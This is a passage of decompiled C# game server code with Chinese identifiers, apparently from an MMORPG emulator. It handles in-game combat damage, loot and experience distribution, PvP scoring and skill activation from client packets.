					int num = Buffer.ToInt32(array, 0);
					int num2 = Buffer.ToInt32(array2, 0);
					Buffer.ToInt32(array3, 0);
					double totalMillisecond = DateTime.Now.Subtract(Pktime).TotalMilliseconds;
					if (num <= 40000)
					{
						攻击类 攻击类 = null;
						using (new Lock(攻击列表, "攻击列表"))
						{
							if (攻击列表.Count < 1 || 攻击列表 == null)
							{
								return;
							}
							if (攻击列表.Count > 1)
							{
								foreach (攻击类 item in 攻击列表)
								{
									if (item.人物ID == num2)
									{
										攻击类 = item;
										break;
									}
								}
							}
							else
							{
								攻击类 = 攻击列表[0];
							}
						}
						if (攻击类 != null)
						{
							int 武功ID = 攻击类.武功ID;
							int 攻击类型 = 攻击类.攻击类型;
							Players value5;
							if (num2 >= 10000)
							{
								if (base.人物善恶 < 0)
								{
									base.人物善恶 += RNG.Next(50, 200);
								}
								if (攻击类.武功ID == 0)
								{
									NpcClass value;
									if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(攻击类.人物ID, out value))
									{
										if (num == base.人物全服ID)
										{
											if (value.Rxjh_HP > 攻击类.攻击力)
											{
												value.Play_Add(this, 攻击类.攻击力);
											}
											else
											{
												value.Play_Add(this, value.Rxjh_HP);
											}
										}
										if (value.Rxjh_HP > 攻击类.攻击力)
										{
											value.Rxjh_HP -= 攻击类.攻击力;
										}
										else
										{
											value.Rxjh_HP = 0;
										}
										if (value.Rxjh_HP <= 0 && !value.NPC死亡)
										{
											double 金钱 = (uint)value.获得钱();
											double num3 = value.获得经验();
											double 历练 = value.获得历练();
											double 升天历练 = value.获得升天历练();
											吸魂(num2);
											if (中级附魂_奇缘 != 0 && RNG.Next(1, 100) <= 中级附魂_奇缘)
											{
												num3 *= 2.0;
												显示大字(base.人物全服ID, 403);
											}
											分配经验历练金钱(value, num3, 历练, 金钱, 升天历练);
											try
											{
												if (value.PlayGj != null && value.PlayGj.Count >= 2)
												{
													int num4 = 0;
													int num5 = base.人物全服ID;
													foreach (PlayGjClass item2 in value.PlayGj)
													{
														if (num4 < item2.Gjxl)
														{
															num4 = item2.Gjxl;
															num5 = item2.PlayID;
														}
													}
													Players players = 得到人物数据(num5);
													if (players != null && players.查找范围Npc(100, value))
													{
														if (base.Player_Level - value.Level < World.获得经验等级差)
														{
															value.发送死亡数据(num5);
														}
														else
														{
															value.发送死亡数据(base.人物全服ID);
														}
													}
													else
													{
														value.发送死亡数据(base.人物全服ID);
													}
												}
												else
												{
													value.发送死亡数据(base.人物全服ID);
												}
											}
											catch (Exception ex)
											{
												攻击列表.Clear();
												Form1.WriteLine(1, "计算最终物品获得玩家   错误" + ex.Message);
											}
											攻击列表.Clear();
										}
										else
										{
											if (value.自动攻击 != null && !value.自动攻击.Enabled)
											{
												value.自动移动.Enabled = false;
												value.自动攻击.Enabled = true;
											}
											if (攻击类型 < 150)
											{
												物理攻击人物ID = num2;
												if (自动攻击 != null)
												{
													自动攻击.Enabled = false;
													自动攻击.Close();
													自动攻击.Dispose();
													自动攻击 = null;
												}
												自动攻击 = new System.Timers.Timer(300.0);
												自动攻击.Elapsed += 自动攻击事件;
												自动攻击.Enabled = true;
												自动攻击.AutoReset = true;
											}
											else
											{
												攻击列表.Clear();
											}
										}
										攻击列表.Clear();
									}
									goto IL_0d1a;
								}
								武功类 value2;
								if (World.TBL_KONGFU.TryGetValue(攻击类.武功ID, out value2))
								{
									if (自动攻击 != null)
									{
										自动攻击.Enabled = false;
										自动攻击.Close();
										自动攻击.Dispose();
										自动攻击 = null;
									}
									if (base.Player_Job != 6 || value2.FLD_PID != 801303)
									{
										NpcClass value3;
										if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(攻击类.人物ID, out value3))
										{
											if (value2.FLD_TYPE != 4 && !触发流星漫天 && !触发杀星义气虎 && !触发杀星义气杀)
											{
												if (num == base.人物全服ID)
												{
													if (value3.Rxjh_HP > 攻击类.攻击力)
													{
														value3.Play_Add(this, 攻击类.攻击力);
													}
													else
													{
														value3.Play_Add(this, value3.Rxjh_HP);
													}
												}
												if (value3.Rxjh_HP > 攻击类.攻击力)
												{
													value3.Rxjh_HP -= 攻击类.攻击力;
												}
												else
												{
													value3.Rxjh_HP = 0;
												}
												if (value3.Rxjh_HP <= 0 && !value3.NPC死亡)
												{
													double 金钱2 = (uint)value3.获得钱();
													double num6 = value3.获得经验();
													double 历练2 = value3.获得历练();
													double 升天历练2 = value3.获得升天历练();
													吸魂(num2);
													if (中级附魂_奇缘 != 0 && RNG.Next(1, 100) <= 中级附魂_奇缘)
													{
														num6 *= 2.0;
														显示大字(base.人物全服ID, 403);
													}
													分配经验历练金钱(value3, num6, 历练2, 金钱2, 升天历练2);
													if (value3.PlayGj != null && value3.PlayGj.Count >= 2)
													{
														int num7 = 0;
														int num8 = base.人物全服ID;
														foreach (PlayGjClass item3 in value3.PlayGj)
														{
															if (num7 < item3.Gjxl)
															{
																num7 = item3.Gjxl;
																num8 = item3.PlayID;
															}
														}
														Players players2 = 得到人物数据(num8);
														if (players2 != null && players2.查找范围Npc(100, value3))
														{
															if (base.Player_Level - value3.Level < World.获得经验等级差)
															{
																value3.发送死亡数据(num8);
															}
															else
															{
																value3.发送死亡数据(base.人物全服ID);
															}
														}
														else
														{
															value3.发送死亡数据(base.人物全服ID);
														}
													}
													else
													{
														value3.发送死亡数据(base.人物全服ID);
													}
													攻击列表.Clear();
												}
												else
												{
													if (value3.自动攻击 != null && !value3.自动攻击.Enabled)
													{
														value3.自动移动.Enabled = false;
														value3.自动攻击.Enabled = true;
													}
													if (武功连击记数器 > 0)
													{
														if (自动攻击 != null)
														{
															自动攻击.Close();
															自动攻击.Dispose();
															自动攻击 = null;
														}
														魔法攻击(攻击类.武功ID, num2);
													}
													else
													{
														攻击列表.Clear();
													}
												}
											}
											else
											{
												触发流星漫天 = false;
												触发杀星义气杀 = false;
												触发杀星义气虎 = false;
												if (value3.Rxjh_HP > 攻击类.攻击力)
												{
													value3.Play_Add(this, 攻击类.攻击力);
													value3.Rxjh_HP -= 攻击类.攻击力;
												}
												else
												{
													value3.Play_Add(this, value3.Rxjh_HP);
													value3.Rxjh_HP = 0;
												}
												if (value3.Rxjh_HP <= 0 && !value3.NPC死亡)
												{
													double 金钱3 = (uint)value3.获得钱();
													double num9 = value3.获得经验();
													double 历练3 = value3.获得历练();
													double 升天历练3 = value3.获得升天历练();
													吸魂(num2);
													if (中级附魂_奇缘 != 0 && RNG.Next(1, 100) <= 中级附魂_奇缘)
													{
														num9 *= 2.0;
														显示大字(base.人物全服ID, 403);
													}
													分配经验历练金钱(value3, num9, 历练3, 金钱3, 升天历练3);
													if (value3.PlayGj != null && value3.PlayGj.Count >= 2)
													{
														int num10 = 0;
														int num11 = base.人物全服ID;
														foreach (PlayGjClass item4 in value3.PlayGj)
														{
															if (num10 < item4.Gjxl)
															{
																num10 = item4.Gjxl;
																num11 = item4.PlayID;
															}
														}
														Players players3 = 得到人物数据(num11);
														if (players3 != null && players3.查找范围Npc(100, value3))
														{
															if (base.Player_Level - value3.Level < World.获得经验等级差)
															{
																value3.发送死亡数据(num11);
															}
															else
															{
																value3.发送死亡数据(base.人物全服ID);
															}
														}
														else
														{
															value3.发送死亡数据(base.人物全服ID);
														}
													}
													else
													{
														value3.发送死亡数据(base.人物全服ID);
													}
													武功连击记数器 = 0;
													foreach (群攻击类 item5 in 攻击类.群攻)
													{
														if (item5.人物ID == value3.FLD_INDEX)
														{
															攻击类.群攻.Remove(item5);
															break;
														}
													}
												}
												else
												{
													if (value3.自动攻击 != null && !value3.自动攻击.Enabled)
													{
														value3.自动移动.Enabled = false;
														value3.自动攻击.Enabled = true;
													}
													if (武功连击记数器 > 0)
													{
														if (自动攻击 != null)
														{
															自动攻击.Close();
															自动攻击.Dispose();
															自动攻击 = null;
														}
														魔法攻击(攻击类.武功ID, num2);
													}
													else
													{
														攻击列表.Clear();
													}
												}
												foreach (群攻击类 item6 in 攻击类.群攻)
												{
													NpcClass value4;
													if (NpcList.TryGetValue(item6.人物ID, out value4) && value4.FLD_INDEX != value3.FLD_INDEX)
													{
														if (value4.Rxjh_HP > item6.攻击力)
														{
															value4.Play_Add(this, item6.攻击力);
															value4.Rxjh_HP -= item6.攻击力;
														}
														else
														{
															value4.Play_Add(this, value4.Rxjh_HP);
															value4.Rxjh_HP = 0;
														}
														if (value4.Rxjh_HP <= 0 && !value4.NPC死亡)
														{
															double 金钱4 = (uint)value4.获得钱();
															double num12 = value4.获得经验();
															double 历练4 = value4.获得历练();
															吸魂(num2);
															double 升天历练4 = value4.获得升天历练();
															if (中级附魂_奇缘 != 0 && RNG.Next(1, 100) <= 中级附魂_奇缘)
															{
																num12 *= 2.0;
																显示大字(base.人物全服ID, 403);
															}
															分配经验历练金钱(value4, num12, 历练4, 金钱4, 升天历练4);
															if (value4.PlayGj != null && value4.PlayGj.Count >= 2)
															{
																int num13 = 0;
																int num14 = base.人物全服ID;
																foreach (PlayGjClass item7 in value4.PlayGj)
																{
																	if (num13 < item7.Gjxl)
																	{
																		num13 = item7.Gjxl;
																		num14 = item7.PlayID;
																	}
																}
																Players players4 = 得到人物数据(num14);
																if (players4 != null && players4.查找范围Npc(100, value4))
																{
																	if (base.Player_Level - value3.Level < World.获得经验等级差)
																	{
																		value4.发送死亡数据(num14);
																	}
																	else
																	{
																		value4.发送死亡数据(base.人物全服ID);
																	}
																}
																else
																{
																	value4.发送死亡数据(base.人物全服ID);
																}
															}
															else
															{
																value4.发送死亡数据(base.人物全服ID);
															}
															攻击列表.Clear();
														}
														else
														{
															if (value4.自动攻击 != null && !value4.自动攻击.Enabled)
															{
																value4.自动移动.Enabled = false;
																value4.自动攻击.Enabled = true;
															}
															if (武功连击记数器 > 0)
															{
																if (自动攻击 != null)
																{
																	自动攻击.Close();
																	自动攻击.Dispose();
																	自动攻击 = null;
																}
																魔法攻击(攻击类.武功ID, num2);
															}
															else
															{
																攻击列表.Clear();
															}
														}
													}
												}
											}
											攻击列表.Clear();
										}
										goto IL_0d1a;
									}
									更新HP_MP_SP();
								}
							}
							else if (PlayList.TryGetValue(攻击类.人物ID, out value5))
							{
								int num15 = 0;
								int num16 = 0;
								try
								{
									using (new Lock(攻击列表, "攻击列表"))
									{
										foreach (攻击类 item8 in 攻击列表)
										{
											if (num16 > 5)
											{
												break;
											}
											if (item8.人物ID == num2)
											{
												num15 += item8.攻击力;
												if (base.当前激活技能ID != 0)
												{
													break;
												}
												num16++;
											}
										}
									}
									for (int i = 0; i < 15; i++)
									{
										ItmeClass itmeID = ItmeClass.GetItmeID(Buffer.ToInt32(value5.装备栏已穿装备[i].物品ID, 0));
										if (itmeID != null && (itmeID.FLD_RESIDE2 == 1 || itmeID.FLD_RESIDE2 == 2 || itmeID.FLD_RESIDE2 == 5 || itmeID.FLD_RESIDE2 == 6) && itmeID.FLD_NJ > 0 && value5.装备栏已穿装备[i].FLD_FJ_NJ > 0)
										{
											value5.装备栏已穿装备[i].FLD_FJ_NJ -= World.防具PK掉耐久度;
											if (value5.装备栏已穿装备[i].FLD_FJ_NJ < 0)
											{
												value5.装备栏已穿装备[i].FLD_FJ_NJ = 0;
											}
											break;
										}
									}
									if (装备栏已穿装备[3].FLD_FJ_NJ > 0)
									{
										装备栏已穿装备[3].FLD_FJ_NJ -= World.武器PK掉耐久度;
										if (装备栏已穿装备[3].FLD_FJ_NJ < 0)
										{
											装备栏已穿装备[3].FLD_FJ_NJ = 0;
										}
									}
								}
								catch (Exception ex2)
								{
									攻击列表.Clear();
									Form1.WriteLine(1, "出错!攻击列表[" + base.Userid + "]-[" + base.UserName + "]" + ex2.Message);
								}
								if (value5.Player_Job == 3)
								{
									if (value5.枪_狂神降世 != 0.0 && !value5.怒)
									{
										value5.人物_SP += (int)(3.0 + (double)(value5.Player_Level * 2) * value5.枪_狂神降世);
									}
								}
								else if (value5.Player_Job == 10)
								{
									if (value5.拳师_狂神降世 != 0.0 && !value5.怒)
									{
										value5.人物_SP += (int)(3.0 + (double)(value5.Player_Level * 2) * value5.拳师_狂神降世);
									}
								}
								else if (value5.Player_Job == 6)
								{
									if (value5.刺_荆轲之怒 != 0.0)
									{
										value5.人物_SP += (int)(3.0 + (double)value5.Player_Level * 0.5 * 0.01 * value5.刺_荆轲之怒);
									}
									else if (num15 <= 0)
									{
										int num17 = ++value5.人物_SP;
									}
									else
									{
										value5.人物_SP += 2;
									}
								}
								else if (value5.Player_Job == 7)
								{
									if (num15 <= 0)
									{
										int num17 = ++value5.人物_SP;
									}
									else
									{
										value5.人物_SP += 2;
									}
								}
								else if (num15 <= 0)
								{
									if (!value5.怒)
									{
										int num17 = ++value5.人物_SP;
									}
								}
								else if (!value5.怒)
								{
									value5.人物_SP += 2;
								}
								if (value5.FLD_装备_追加_愤怒 > 0 && !value5.怒)
								{
									value5.人物_SP += base.FLD_装备_追加_愤怒;
								}
								if (base.FLD_装备_追加_初始化愤怒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= base.FLD_装备_追加_初始化愤怒概率百分比)
								{
									value5.人物_SP = 0;
								}
								if (num15 <= 0)
								{
									num15 = 1;
								}
								value5.人物_HP -= num15;
								if (!value5.检查毒蛇出洞状态())
								{
									if (value5.Player_Job == 1)
									{
										if ((double)RNG.Next(1, 110) <= value5.人反伤几率)
										{
											int num18 = num15;
											if (num18 <= 0)
											{
												num18 = 1;
											}
											if ((double)RNG.Next(1, 100) <= value5.刀_升天二气功_穷途末路)
											{
												value5.显示大字(value5.人物全服ID, 19);
												num18 *= 2;
											}
											if (base.Player_Job == 9 && (double)RNG.Next(1, 110) <= base.谭_升天三气功_以柔克刚 + base.升天五式_惊涛骇浪)
											{
												显示大字(base.人物全服ID, 700);
												num18 = 0;
											}
											发送反伤攻击数据(num18, value5.人物全服ID);
											if (num18 <= 0)
											{
												num18 = 1;
											}
											base.人物_HP -= num18;
											if (base.人物_HP <= 0)
											{
												if (自动攻击 != null)
												{
													自动攻击.Enabled = false;
													自动攻击.Close();
													自动攻击.Dispose();
													自动攻击 = null;
												}
												PK死亡 = true;
												base.人物_HP = 0;
												死亡();
											}
										}
									}
									else if (value5.Player_Job == 2)
									{
										if ((double)RNG.Next(1, 100) <= value5.剑_升天三气功_火凤临朝 && value5.人物_HP <= 0)
										{
											value5.人物_HP = 10;
											value5.显示大字(value5.人物全服ID, 322);
										}
									}
									else if (value5.Player_Job == 7)
									{
										if ((double)RNG.Next(1, 100) <= value5.琴师_升天二气功_三潭映月 * 0.3 + 3.0)
										{
											value5.显示大字(value5.人物全服ID, 391);
											int num19 = num15;
											if (num19 <= 0)
											{
												num19 = 1;
											}
											base.人物_HP -= num19;
											if (base.人物_HP <= 0)
											{
												if (自动攻击 != null)
												{
													自动攻击.Enabled = false;
													自动攻击.Close();
													自动攻击.Dispose();
													自动攻击 = null;
												}
												PK死亡 = true;
												base.人物_HP = 0;
												死亡();
											}
										}
									}
									else if (value5.Player_Job == 8)
									{
										if ((double)RNG.Next(1, 140) <= value5.韩_追骨吸元)
										{
											int num20 = (int)((double)num15 * value5.韩_追骨吸元 * 0.01);
											if (num20 <= 0)
											{
												num20 = 1;
											}
											if (base.Player_Job == 9 && (double)RNG.Next(0, 100) < base.谭_升天三气功_以柔克刚 + base.升天五式_惊涛骇浪)
											{
												显示大字(base.人物全服ID, 700);
												num20 = 0;
											}
											value5.加血(num20);
											base.人物_HP -= num20;
											if (base.人物_HP <= 0)
											{
												if (自动攻击 != null)
												{
													自动攻击.Enabled = false;
													自动攻击.Close();
													自动攻击.Dispose();
													自动攻击 = null;
												}
												PK死亡 = true;
												base.人物_HP = 0;
												死亡();
											}
										}
									}
									else if (value5.Player_Job == 9 && (double)RNG.Next(1, 100) <= value5.谭_升天三气功_火凤临朝 && value5.人物_HP <= 0)
									{
										value5.人物_HP = 10;
										value5.显示大字(value5.人物全服ID, 322);
									}
								}
								if (锁定人物几率 > 0 && (double)RNG.Next(1, 100) <= (double)锁定人物几率)
								{
									if (value5.异常状态 != null)
									{
										if (!value5.GetAbnormalState(17))
										{
											异常状态类 value6 = new 异常状态类(value5, 2000, 17, 0.0);
											value5.异常状态.Add(17, value6);
											value5.人物锁定 = true;
										}
									}
									else
									{
										value5.异常状态 = new ThreadSafeDictionary<int, 异常状态类>();
										异常状态类 value7 = new 异常状态类(value5, 2000, 17, 0.0);
										value5.异常状态.Add(17, value7);
										value5.人物锁定 = true;
									}
								}
								攻击列表.Clear();
								if (value5.人物_HP <= 0)
								{
									if (自动攻击 != null)
									{
										自动攻击.Enabled = false;
										自动攻击.Close();
										自动攻击.Dispose();
										自动攻击 = null;
									}
									value5.PK死亡 = true;
									value5.人物_HP = 0;
									value5.死亡();
									if (神女异常状态.ContainsKey(40) && value5.人物全服ID == 神女虚弱ID)
									{
										base.人物_HP -= (int)((double)base.人物最大_HP * 0.15);
										if (base.人物_HP <= 1)
										{
											base.人物_HP = 1;
										}
										更新HP_MP_SP();
									}
									else if (神女异常状态.ContainsKey(41) && value5.人物全服ID == 神女虚弱ID)
									{
										base.人物_HP -= (int)((double)base.人物最大_HP * 0.3);
										if (base.人物_HP <= 1)
										{
											base.人物_HP = 1;
										}
										更新HP_MP_SP();
									}
									if (base.人物坐标_地图 != 7001 && base.人物坐标_地图 != 7101)
									{
										if (base.人物坐标_地图 == 801)
										{
											if (World.势力战进程 == 3)
											{
												if (base.绑定帐号 != value5.绑定帐号)
												{
													if (检查玩家是否在势力战区域内(this))
													{
														if (检查玩家是否在势力战区域内(value5))
														{
															int num17 = ++value5.势力战死亡数;
															num17 = ++base.势力战杀人数;
															EventTopClass value8;
															if (World.EventTop.TryGetValue(base.UserName, out value8))
															{
																value8.杀人数++;
															}
															else
															{
																value8 = new EventTopClass();
																value8.人物名 = base.UserName;
																value8.等级 = base.Player_Level;
																value8.职业 = base.Player_Job;
																value8.势力 = base.势力战派别;
																value8.帮派 = base.帮派名字;
																value8.杀人数 = 1;
																value8.死亡数 = 0;
																World.EventTop.Add(base.UserName, value8);
															}
															EventTopClass value9;
															if (World.EventTop.TryGetValue(value5.UserName, out value9))
															{
																value9.死亡数++;
															}
															else
															{
																EventTopClass eventTopClass = new EventTopClass();
																eventTopClass.人物名 = value5.UserName;
																eventTopClass.等级 = value5.Player_Level;
																eventTopClass.职业 = value5.Player_Job;
																value8.势力 = value5.势力战派别;
																eventTopClass.帮派 = value5.帮派名字;
																eventTopClass.杀人数 = 0;
																eventTopClass.死亡数 = 1;
																World.EventTop.Add(value5.UserName, eventTopClass);
															}
															if (Buffer.IsEquals(base.势力战派别, "仙族"))
															{
																World.势力战正分数 += (int)((double)value5.Player_Level * 0.15);
															}
															else if (Buffer.IsEquals(base.势力战派别, "魔族"))
															{
																World.势力战邪分数 += (int)((double)value5.Player_Level * 0.15);
															}
															系统提示("当前势力战杀人数[" + base.势力战杀人数 + "]。");
															value5.系统提示("当前势力战死亡数[" + value5.势力战死亡数 + "]。");
														}
														else
														{
															系统提示("对方已超出势力战对战范围,不能获得分数。");
														}
													}
													else
													{
														系统提示("你已超出势力战对战范围,不能获得分数。");
													}
												}
												else
												{
													系统提示("杀死同IP玩家不能获得分数。");
												}
											}
										}
										else if (base.人物坐标_地图 == 2301 && World.Eve90进程 == 3)
										{
											if (base.绑定帐号 != value5.绑定帐号)
											{
												if (检查玩家是否在对练区内(this))
												{
													if (value5.检查玩家是否在对练区内(value5))
													{
														PVP分数++;
													}
													else
													{
														value5.系统提示("超出对战范围,不能获得分数。");
													}
												}
												else
												{
													系统提示("超出对战范围,不能获得分数。");
												}
											}
											else
											{
												系统提示("杀死同IP玩家不能获得分数。");
											}
										}
										else if (base.人物坐标_地图 == 7301 && World.新门战进程 == 2 && base.绑定帐号 != value5.绑定帐号 && 检查玩家是否在帮战区内(this) && 检查玩家是否在帮战区内(value5))
										{
											foreach (帮战Class value10 in World.帮战list.Values)
											{
												if (value10.申请帮派ID == base.帮派Id)
												{
													value10.当前分数++;
												}
											}
										}
										else
										{
											if (value5.人物善恶 < 0)
											{
												value5.人物善恶 += 250;
												if (base.人物善恶 < 0 || base.Player_Zx != value5.Player_Zx || !Buffer.IsEquals(base.帮派名字, value5.帮派名字))
												{
													base.人物善恶 += 100;
												}
											}
											else if (base.人物善恶 < 0)
											{
												if (base.Player_Zx == value5.Player_Zx && Buffer.IsEquals(base.帮派名字, value5.帮派名字))
												{
													base.人物善恶 -= 500;
												}
												else
												{
													base.人物善恶 += 100;
												}
											}
											else if (base.Player_Zx != value5.Player_Zx && !Buffer.IsEquals(base.帮派名字, value5.帮派名字))
											{
												base.人物善恶 += 100;
											}
											else
											{
												base.人物善恶 -= 500;
											}
											string str = base.UserName + "在" + World.服务器ID + "线" + 坐标Class.getname(base.人物坐标_地图) + "[" + (int)base.人物坐标_X + "," + (int)base.人物坐标_Y + "]击杀：" + value5.UserName + "不服来战！";
											World.conn.发送("PK提示|" + 22 + "|" + str);
											if (World.是否开启武勋系统 == 1)
											{
												武勋系统(this, value5, 0);
											}
											value5.更新武功和状态();
											更新武功和状态();
										}
									}
								}
								else if ((uint)(攻击类型 - 112) <= 1u || (uint)(攻击类型 - 126) <= 8u || 攻击类型 == 136)
								{
									物理攻击人物ID = num2;
									if (自动攻击 != null)
									{
										自动攻击.Enabled = false;
										自动攻击.Close();
										自动攻击.Dispose();
										自动攻击 = null;
									}
									自动攻击 = new System.Timers.Timer(500.0);
									自动攻击.Elapsed += 自动攻击事件;
									自动攻击.Enabled = true;
									自动攻击.AutoReset = true;
								}
								更新HP_MP_SP();
								value5.更新HP_MP_SP();
							}
						}
					}
				}
				goto end_IL_0000;
				IL_0d1a:
				更新HP_MP_SP();
				end_IL_0000:;
			}
			catch (Exception ex3)
			{
				攻击列表.Clear();
				攻击类 攻击类2 = null;
				Form1.WriteLine(1, "攻击确认   错误|" + base.UserName + "|" + 攻击类2.武功ID + ex3.Message);
			}
		}

		private void 自动攻击事件(object sender, ElapsedEventArgs e)
		{
			if (物理攻击人物ID <= 0)
			{
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				return;
			}
			物理攻击(0, 物理攻击人物ID);
			if (自动攻击 != null)
			{
				自动攻击.Enabled = false;
				自动攻击.Close();
				自动攻击.Dispose();
				自动攻击 = null;
			}
		}

		public void 触发自动攻击()
		{
			foreach (NpcClass value in MapClass.GetnpcTemplate(base.人物坐标_地图).Values)
			{
				if (value.IsNpc == 0 && value.FLD_AUTO == 1 && value.Level >= base.Player_Level - 20 && !value.NPC死亡 && !value.自动攻击.Enabled && 查找范围Npc(60, value))
				{
					value.Play_Add(this, 0);
					value.自动移动.Enabled = false;
					value.自动攻击.Enabled = true;
				}
			}
		}

		public void 魔法不足提示()
		{
			if (!base.Player死亡)
			{
				byte[] array = Converter.hexStringToByte("AA55160000003D0008000E2C090002000000000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
		}

		public void 轻功(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				byte[] array2 = new byte[2];
				System.Buffer.BlockCopy(封包数据, 10, array, 0, 4);
				System.Buffer.BlockCopy(封包数据, 4, array2, 0, 2);
				BitConverter.ToInt16(array2, 0);
				int num = BitConverter.ToInt32(array, 0);
				if (异常状态 != null && 异常状态.ContainsKey(8))
				{
					发送激活技能数据(num, 11);
				}
				else if (base.人物坐标_地图 != 9001 && base.人物坐标_地图 != 9101 && base.人物坐标_地图 != 9201)
				{
					武功类 value;
					if (人物灵兽 != null && 人物灵兽.骑 == 1)
					{
						发送激活技能数据(num, 10);
					}
					else if (World.TBL_KONGFU.TryGetValue(num, out value))
					{
						if (base.人物_MP < value.FLD_MP)
						{
							魔法不足提示();
						}
						else if ((value.FLD_JOB == 0 || base.Player_Job == value.FLD_JOB) && (value.FLD_ZX == 0 || base.Player_Zx == value.FLD_ZX) && base.Player_Job_leve >= value.FLD_JOBLEVEL && base.Player_Level >= value.FLD_LEVEL && 武功类.GetsfeWg(this, value.FLD_PID))
						{
							switch (value.FLD_PID)
							{
							case 401201:
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								break;
							case 301201:
							{
								if (GetAddState(301201))
								{
									追加状态列表[301201].时间结束事件();
								}
								追加状态类 value10 = new 追加状态类(this, 300000, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value10);
								addFLD_追加百分比_攻击(0.1);
								base.FLD_追加百分比_HP上限 += 0.05;
								更新武功和状态();
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								break;
							}
							case 201201:
							{
								if (GetAddState(201201))
								{
									追加状态列表[201201].时间结束事件();
								}
								追加状态类 value21 = new 追加状态类(this, 300000, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value21);
								addFLD_追加百分比_攻击(0.05);
								更新武功和状态();
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								break;
							}
							case 401401:
							{
								if (GetAddState(401401))
								{
									追加状态列表[401401].时间结束事件();
								}
								追加状态类 value22 = new 追加状态类(this, 30000 + (int)base.弓_回流真气, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value22);
								base.FLD_追加百分比_命中 += 0.4;
								base.FLD_追加百分比_HP上限 += 0.2;
								更新武功和状态();
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 30000 + (int)base.弓_回流真气);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								break;
							}
							case 601101:
							{
								if (GetAddState(601102))
								{
									追加状态列表[601102].时间结束事件();
								}
								if (GetAddState(601101))
								{
									追加状态列表[601101].时间结束事件();
								}
								if (GetAddState(601103))
								{
									追加状态列表[601103].时间结束事件();
								}
								if (潜行模式 == 1)
								{
									潜行状态(0);
								}
								追加状态类 value8 = new 追加状态类(this, 300000, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value8);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
								行走状态id = 2;
								行走状态(array, 2);
								更新移动速度();
								break;
							}
							case 601102:
								if (潜行模式 == 1)
								{
									潜行状态(0);
								}
								if (GetAddState(601101))
								{
									追加状态列表[601101].时间结束事件();
								}
								if (GetAddState(601103))
								{
									追加状态列表[601103].时间结束事件();
								}
								if (!GetAddState(601102))
								{
									追加状态类 value17 = new 追加状态类(this, 300000, value.FLD_PID, 0);
									追加状态列表.Add(value.FLD_PID, value17);
									状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
								}
								行走状态id = 3;
								行走状态(array, 3);
								更新移动速度();
								break;
							case 601103:
								if (潜行模式 == 1)
								{
									潜行状态(0);
								}
								if (GetAddState(601101))
								{
									追加状态列表[601101].时间结束事件();
								}
								if (GetAddState(601102))
								{
									追加状态列表[601102].时间结束事件();
								}
								if (!GetAddState(601103))
								{
									追加状态类 value4 = new 追加状态类(this, 300000, value.FLD_PID, 0);
									追加状态列表.Add(value.FLD_PID, value4);
									状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
								}
								行走状态id = 5;
								行走状态(array, 5);
								更新移动速度();
								break;
							case 430102:
							case 430202:
							case 430302:
							case 430402:
							case 430502:
							case 440102:
							case 440202:
							case 440302:
							case 440402:
							case 440502:
							{
								long get物品ID = 装备栏已穿装备[12].Get物品ID;
								int num13 = (装备栏已穿装备[3].Get物品ID == 0L || get物品ID == 0L) ? 6 : ((get物品ID == 0L || get物品ID == 1000000995L) ? 1 : 7);
								if (base.当前激活技能ID == value.FLD_PID)
								{
									base.当前激活技能ID = 0;
								}
								else
								{
									base.当前激活技能ID = value.FLD_PID;
								}
								发送激活技能数据(value.FLD_PID, num13);
								if (num13 != 1)
								{
									base.当前激活技能ID = 0;
								}
								break;
							}
							case 801301:
								if ((int)DateTime.Now.Subtract(Pktime801301).TotalSeconds < 30)
								{
									return;
								}
								Pktime801301 = DateTime.Now;
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								break;
							case 801202:
								if ((int)DateTime.Now.Subtract(Pktime801202).TotalSeconds < 240)
								{
									return;
								}
								Pktime801202 = DateTime.Now;
								if (GetAddState(601103))
								{
									追加状态列表[601103].时间结束事件();
								}
								if (GetAddState(601102))
								{
									追加状态列表[601102].时间结束事件();
								}
								if (GetAddState(601101))
								{
									追加状态列表[601101].时间结束事件();
								}
								行走状态id = 1;
								if (潜行模式 == 0)
								{
									系统提示("背包没空位了。");
									潜行状态(1);
								}
								else
								{
									潜行状态(0);
								}
								状态效果(BitConverter.GetBytes(value.FLD_PID), 0, 0);
								行走状态(BitConverter.GetBytes(value.FLD_PID), 0);
								更新移动速度();
								break;
							case 801201:
							{
								if (GetAddState(value.FLD_PID))
								{
									return;
								}
								int num3 = 100000;
								if (base.刺_剑刃乱舞 > 0.0)
								{
									num3 += (int)base.刺_剑刃乱舞 * 1000;
								}
								追加状态类 value5 = new 追加状态类(this, num3, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value5);
								base.FLD_攻击速度 = 150;
								更新武功和状态();
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num3);
								行走状态(BitConverter.GetBytes(value.FLD_PID), 1);
								更新攻击速度();
								break;
							}
							case 801401:
							{
								if (GetAddState(value.FLD_PID))
								{
									追加状态列表[value.FLD_PID].时间结束事件();
								}
